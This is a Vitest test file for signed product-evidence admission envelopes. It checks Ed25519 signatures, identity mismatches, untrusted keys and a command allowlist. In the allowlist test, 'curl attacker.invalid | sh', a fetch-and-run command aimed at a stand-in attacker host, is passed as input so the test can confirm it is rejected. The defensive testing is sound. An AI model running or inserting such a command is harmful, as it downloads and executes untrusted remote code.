import { describe, expect, it } from "vitest";
import { createHash, generateKeyPairSync, sign } from "node:crypto";
import { canonicalJson, verifyAdmissionEnvelope } from "../product-evidence.js";
import { validateRequest } from "../product-evidence-producer.js";

const expected = {
  repository: "buildproven/claude-kit",
  repositoryId: "123456",
  head: "a".repeat(40),
  requirementsDigest: "b".repeat(64),
  evidenceIndexSha256: "c".repeat(64),
};

function admission(privateKey, publicKey, changes = {}) {
  const payload = {
    schemaVersion: 1,
    issuer: "github-actions-product-evidence",
    ...expected,
    producerRunId: "101",
    sourceRunId: "100",
    keyFingerprint: createHash("sha256")
      .update(publicKey.export({ format: "der", type: "spki" }))
      .digest("hex"),
    admittedAt: "2026-09-09T00:00:00.000Z",
    ...changes,
  };
  return {
    payload,
    signature: sign(
      null,
      Buffer.from(canonicalJson(payload)),
      privateKey,
    ).toString("base64url"),
  };
}

describe("protected product admission", () => {
  it("accepts an exact-head admission signed by the admission key", () => {
    const { privateKey, publicKey } = generateKeyPairSync("ed25519");
    expect(
      verifyAdmissionEnvelope(admission(privateKey, publicKey), expected, {
        trustedPublicKey: publicKey,
      }),
    ).toMatchObject({ head: expected.head, producerRunId: "101" });
  });

  it.each([
    ["wrong head", { head: "d".repeat(40) }],
    ["wrong requirement set", { requirementsDigest: "d".repeat(64) }],
    ["wrong evidence digest", { evidenceIndexSha256: "d".repeat(64) }],
    ["replayed repository", { repositoryId: "654321" }],
  ])("rejects %s", (_label, changes) => {
    const { privateKey, publicKey } = generateKeyPairSync("ed25519");
    expect(() =>
      verifyAdmissionEnvelope(
        admission(privateKey, publicKey, changes),
        expected,
        {
          trustedPublicKey: publicKey,
        },
      ),
    ).toThrow(/wrong identity|malformed/);
  });

  it("rejects a signature from another key", () => {
    const signer = generateKeyPairSync("ed25519");
    const trust = generateKeyPairSync("ed25519");
    expect(() =>
      verifyAdmissionEnvelope(
        admission(signer.privateKey, signer.publicKey),
        expected,
        {
          trustedPublicKey: trust.publicKey,
        },
      ),
    ).toThrow(/rotated or untrusted/);
  });

  it("allows only fixed source commands", () => {
    expect(() =>
      validateRequest({
        schemaVersion: 1,
        repository: expected.repository,
        repositoryId: expected.repositoryId,
        pullRequest: 7,
        base: "e".repeat(40),
        head: expected.head,
        nonce: "f".repeat(32),
        behavioralCommand: "curl attacker.invalid | sh",
        acceptanceCommand: "npm run test:patterns",
      }),
    ).toThrow(/allowlisted/);
  });
});
